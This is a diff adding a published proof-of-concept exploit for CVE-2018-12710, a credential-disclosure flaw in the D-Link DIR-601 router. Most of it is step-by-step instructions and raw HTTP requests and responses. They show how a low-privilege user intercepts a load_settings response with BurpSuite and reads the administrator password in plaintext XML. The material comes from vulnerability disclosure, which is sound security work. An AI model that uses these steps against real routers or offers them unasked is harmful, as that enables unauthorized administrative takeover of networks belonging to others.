@@ -1,0 +1,68 @@
+# Exploit Title: DLink DIR-601 - Credential Disclosure
+# Google Dork: N/A
+# Date: 2018-06-24
+# Exploit Author: Kevin Randall
+# Vendor Homepage: https://www.dlink.com
+# Software Link: N/A
+# Version: Firmware: 2.02NA Hardware Version B1
+# Tested on: Windows 10 + Mozilla Firefox
+# CVE : CVE-2018-12710
+ 
+# 1. Description
+# Being local to the network and having only "User" account (which is a low privilege account)
+# access, an attacker can intercept the response from a POST request to obtain "Admin"
+# rights due to the admin password being displayed in XML.
+
+# 2. Proof of Concept
+# Tools to use:
+# - BurpSuite
+# - Browser of your choice
+
+# 3: Login with "User" role account:
+*My "User" role account does not have a password in this example*
+POST /my_cgi.cgi?0.4008728147399542 HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-AU,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.1/login_real.htm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+DNT: 1
+Connection: close
+
+request=login&user_user_name=dXNlcg==&user_user_pwd=&user_type=1
+
+# 4: When logged into the access point, click on the Tools option
+
+# 5: You should see a request similar to the following:
+
+POST /my_cgi.cgi?0.9277791631615954 HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-AU,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.1/tools_admin.htm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 277
+DNT: 1
+Connection: close
+
+request=load_settings&table_name=admin_user&table_name=user_user&table_name=graph_auth&table_name=remote_management&table_name=system&table_name=virtual_server&table_name=port_forwarding&table_name=application_rules&table_name=inbound_filter&table_name=fw_ver&table_name=hw_ver
+
+# 6: Right click on this request and choose "Do Intercept response from this request"
+
+# 7: You will see a response similar to the following:
+
+HTTP/1.1 200 OK
+Content-type: text/xml
+Connection: close
+Date: Sat, 01 Jan 2011 00:19:56 GMT
+Server: lighttpd/1.4.28
+Content-Length: 20088
+
+<?xml version="1.0" encoding="UTF-8"?><root><login_level>0</login_level><admin_user><admin_user_name>admin</admin_user_name>
+<admin_user_pwd>testagain</admin_user_pwd><admin_level>1</admin_level></admin_user><user_user><user_user_name>user</user_user_name>
+<user_user_pwd></user_user_pwd><user_level>0 ...
